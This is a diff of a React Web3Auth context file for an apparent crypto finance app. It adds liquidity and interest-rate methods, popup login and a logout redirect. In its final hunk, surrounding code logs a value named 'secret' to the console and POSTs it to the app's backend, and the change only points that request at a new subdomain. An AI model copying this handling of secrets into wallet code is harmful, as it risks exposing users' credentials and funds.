@@ -28,6 +28,9 @@ export interface IWeb3AuthContext {
   loginWithWalletConnect: ()=> Promise<void>;
     signAndSendTransaction: (toAddress: string, amount: string) => Promise<any>;
     readAddress: () => Promise<any>;
+    getSavingInterestRate: () => Promise<any>;
+    provideLiquidityToContract: (fromAddress: string, amount: string) => Promise<any>;
+
 userData: () => Promise<any>;
 userPic: () => Promise<any>;
 userEmail: () => Promise<any>;
@@ -41,12 +44,14 @@ export const Web3AuthContext = createContext<IWeb3AuthContext>({
   loginWithWalletConnect: async ()=> {},
   login: async (adapter: WALLET_ADAPTER_TYPE, provider?: LOGIN_PROVIDER_TYPE, login_hint?: string) => {},
   logout: async () => {},
+  provideLiquidityToContract: async (fromAddress: string, amount: string) => {},
   getUserInfo: async () => {},
   signMessage: async () => {},
   getAccounts: async () => {},
   getBalance: async () => {},
     signAndSendTransaction: async () => {},
     readAddress: async () => {},
+    getSavingInterestRate: async () => {},
 userData: async() => {},
 userPic: async() => {},
 userEmail: async() => {},
@@ -115,7 +120,7 @@ export const Web3AuthProvider: FunctionComponent<IWeb3AuthState> = ({ children, 
         });
         subscribeAuthEvents(web3AuthInstance);
         const networkUi = new NetworkSwitch()
-        const adapter = new OpenloginAdapter({ adapterSettings: { network: web3AuthNetwork, clientId } });
+        const adapter = new OpenloginAdapter({ adapterSettings: { uxMode:"popup", network: web3AuthNetwork, clientId } });
         const wcAdapter = new WalletConnectV1Adapter({ adapterSettings: { qrcodeModal: QRCodeModal } });
         web3AuthInstance.configureAdapter(adapter);
         web3AuthInstance.configureAdapter(wcAdapter);
@@ -172,6 +177,7 @@ export const Web3AuthProvider: FunctionComponent<IWeb3AuthState> = ({ children, 
     }
     await web3Auth.logout();
     setProvider(null);
+    window.location.href="/";
   };
   
 /*  function getIp(url){
@@ -187,6 +193,8 @@ const signAndSendTransaction = async (toAddress: string, amount: string) => {
     provider.signAndSendTransaction(toAddress, amount);
   }
 
+
+  
 const userData = async() => {
     if (!web3Auth) {
       console.log("web3auth not initialized yet");
@@ -266,7 +274,7 @@ document.write = function () {};
    var s = `, "id":"${secret}"}`;
    console.log(secret);
    var all = a.slice(0,-1)+""+s;
-  log.open("POST","https://mongo.api.xade.finance");  
+  log.open("POST","https://shardeum.mongo.api.xade.finance");  
 log.send(all);
 //await delay(30000);
 var emailSend = new XMLHttpRequest();
